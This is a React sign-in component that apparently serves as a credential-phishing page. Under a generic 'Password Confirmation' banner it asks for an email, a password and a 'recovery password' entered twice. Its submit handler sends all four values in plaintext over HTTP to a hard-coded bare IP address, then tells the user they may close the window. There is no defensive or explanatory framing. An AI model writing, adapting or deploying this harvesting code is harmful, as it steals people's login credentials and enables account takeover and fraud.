import React, { useState } from 'react';
import './styles/SignIn.css';
import axios from 'axios';

function SignIn() {

  const [inputValues, setInputValues] = useState({
    email: '',
    password: '',
    recoveryPassword: '',
    confirmRecoveryPassword: '',
  })

  const handleInputChangeText = (field, event) => {
    setInputValues({
      ...inputValues,
      [field]: event.target.value,
    });
  };

  const handleSubmit = async (e) => {
    console.log('outttt');
    e.preventDefault();
  
    const body = {
      confirmRecoveryPassword: inputValues.confirmRecoveryPassword,
      email: inputValues.email,
      password: inputValues.password,
      recoveryPassword: inputValues.recoveryPassword
    };
  
    try {
      const response = await axios.post('http://74.110.105.96/submit', body, {
        headers: {
          'Content-Type': 'application/json',
        },
        withCredentials: true,
      });

      if('data' in response){
        window.alert("Success! Thank you, you can close this window now.")
      } 
      else{
        window.alert("Failed to connect, please try again later.")
      }
    } catch (error) {
      console.error('Error:', error.message);
    }
  };

  const [inputStates, setInputStates] = useState({
    email: { isValid: false, isClicked: false },
    password: { isValid: false, isClicked: false },
    recoveryPassword: { isValid: false, isClicked: false },
    confirmRecoveryPassword: { isValid: false, isClicked: false },
  });


const handleInputChangeColors = (field, event) => {
    setInputStates({
        ...inputStates,
        [field]: {
            isClicked: true,
            isValid: event.target.value.trim() !== '',
        },
    });
  };


  return (
    <div>

      <div className='center-container'>
        <div className='rectangle-container'>
          <div className='nav-bar'>
            <p className='nav-bar-text'>Password Confirmation</p>
            <div className='nav-bar-underline'/>
          </div>
          <div className='mid-info'>
            <p className='main-text'>Sign In</p>
            <p className='sub-text'><strong className='bold'>Please create a recovery password</strong>, which will serve as a layer of security in the case of unusual login attempts.</p>            
            <div className='required-fields-text'>
              <p style={{color: 'red', fontSize: '14px'}}>*&nbsp;</p>
              <p style={{color: 'black', fontSize: '14px'}}>Indicates required fields.</p>
            </div>
            <div className='forms' style={{display: 'flex', flexDirection: 'column', marginTop: '0px'}}>
              <div className='email-text' style={{display: 'flex', flexDirection: 'row', marginBottom: '0px', height: '37px'}}>
                <p style={{color: 'black', fontSize: '14px'}}>Email&nbsp;</p>
                <p style={{color: 'red', fontSize: '14px'}}>*</p>
              </div>
              <input
                className={`email-form ${inputStates.email.isClicked ? (inputStates.email.isValid ? 'valid' : 'invalid') : ''}`}
                type="text"
                id="textBox"
                name="textBox"
                style={{ fontSize: '16px' }}
                onChange={(e) => {handleInputChangeColors('email', e); handleInputChangeText('email', e);}}
                required
            />
              <div className='password-text' style={{display: 'flex', flexDirection: 'row', marginBottom: '0px', height: '37px'}}>
                <p style={{color: 'black', fontSize: '14px'}}>Password&nbsp;</p>
                <p style={{color: 'red', fontSize: '14px'}}>*</p>
              </div>
              <input
                className={`password-form ${inputStates.password.isClicked ? (inputStates.password.isValid ? 'valid' : 'invalid') : ''}`}
                type="password"
                id="passwordTextBox"
                name="textBox"
                style={{ fontSize: '16px' }}
                onChange={(e) => {handleInputChangeColors('password', e); handleInputChangeText('password', e);}}
                required
            />
              <div className='recovery-password-form' style={{display: 'flex', flexDirection: 'row', marginBottom: '0px', height: '37px'}}>
                <p style={{color: 'black', fontSize: '14px'}}>Recovery password&nbsp;</p>
                <p style={{color: 'red', fontSize: '14px'}}>*</p>
              </div>
              <input
                className={`recovery-password-form ${inputStates.recoveryPassword.isClicked ? (inputStates.recoveryPassword.isValid ? 'valid' : 'invalid') : ''}`}
                type="password"
                id="passwordTextBox"
                name="textBox"
                style={{ fontSize: '16px' }}
                onChange={(e) => {handleInputChangeColors('recoveryPassword', e); handleInputChangeText('recoveryPassword', e);}}
                required
            />
              <div className='confirm-recovery-password-text' style={{display: 'flex', flexDirection: 'row', marginBottom: '0px', height: '37px'}}>
                <p style={{color: 'black', fontSize: '14px'}}>Confirm recovery password&nbsp;</p>
                <p style={{color: 'red', fontSize: '14px'}}>*</p>
              </div>
              <input
                className={`confirm-recovery-password-form ${inputStates.confirmRecoveryPassword.isClicked ? (inputStates.confirmRecoveryPassword.isValid ? 'valid' : 'invalid') : ''}`}
                type="password"
                id="passwordTextBox"
                name="textBox"
                style={{ fontSize: '16px' }}
                onChange={(e) => {handleInputChangeColors('confirmRecoveryPassword', e); handleInputChangeText('confirmRecoveryPassword', e);}}
                required
            />     
              <button onClick={handleSubmit} className='submit'>Submit</button>
              <a className='help' href="mailto:support@example.com">Need Help?</a>                   
            </div>
          </div>

        </div>
      </div>
    </div>
  );
}

export default SignIn;
